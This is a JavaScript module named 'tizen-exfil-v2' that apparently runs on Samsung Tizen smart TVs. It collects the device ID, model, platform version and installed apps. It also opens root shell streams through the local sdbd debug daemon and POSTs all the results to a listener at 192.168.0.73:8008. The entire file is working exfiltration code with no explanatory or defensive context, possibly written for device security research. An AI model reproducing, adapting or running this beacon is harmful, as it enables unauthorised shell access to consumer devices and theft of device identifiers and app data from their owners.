// Beacon IMMEDIATELY to confirm the module is running
var beaconData = {source: 'tizen-exfil-v2', ts: new Date().toISOString()};
try {
    beaconData.platform = tizen.systeminfo.getCapability('http://tizen.org/feature/platform.version');
} catch(e) { beaconData.platform_err = e.message; }
try {
    beaconData.model = tizen.systeminfo.getCapability('http://tizen.org/feature/model');
} catch(e) {}
try {
    beaconData.duid = tizen.systeminfo.getCapability('http://tizen.org/feature/device.id');
} catch(e) {}

// Fire beacon NOW
var fetchFn;
try { fetchFn = require('node-fetch'); } catch(e) { fetchFn = global.fetch; }
fetchFn('http://192.168.0.73:8008/tv-results', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(beaconData)
}).then(function(r){ return r.text(); })
 .then(function(t){ console.log('BEACON OK: ' + t); })
 .catch(function(e){ console.log('BEACON FAIL: ' + e.message); });

// Now collect sdbd data (async, second beacon)
function collectSdbd() {
    try {
        var adbhost = require('adbhost');
        var client = adbhost.createConnection({ host: '127.0.0.1', port: 26101 });
        client._stream.on('connect', function() {
            beaconData.sdbd = 'connected';
            var s = client.createStream('shell:0 getduid');
            var out = '';
            s.on('data', function(c) { out += c.toString(); });
            s.on('end', function() {
                beaconData.getduid = out.trim();
                var s2 = client.createStream('shell:0 vd_applist');
                var out2 = '';
                s2.on('data', function(c) { out2 += c.toString(); });
                s2.on('end', function() {
                    beaconData.vd_applist = out2.substring(0, 5000);
                    beaconData.apps_error = beaconData.apps_error || '';
                    fetchFn('http://192.168.0.73:8008/tv-results', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(beaconData)
                    }).then(function(r){ return r.text(); })
                     .then(function(t){ console.log('SDBD BEACON OK: ' + t); })
                     .catch(function(e){ console.log('SDBD BEACON FAIL: ' + e.message); });
                    try { client._stream.end(); } catch(e2) {}
                });
            });
        });
        client._stream.on('error', function(e) {
            beaconData.sdbd_error = e.message;
            fetchFn('http://192.168.0.73:8008/tv-results', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(beaconData)
            }).catch(function(){});
        });
    } catch(e) {
        beaconData.sdbd_error = e.message;
    }
}

// Collect app list
try {
    tizen.application.getAppInfo(function(info) {
        beaconData.apps = info.map(function(app) {
            return {id: app.id, name: app.name, pkg: app.package, ver: app.version};
        });
        collectSdbd();
    }, function(err) {
        beaconData.apps_error = err.message;
        collectSdbd();
    });
} catch(e) {
    beaconData.apps_error = e.message;
    collectSdbd();
}
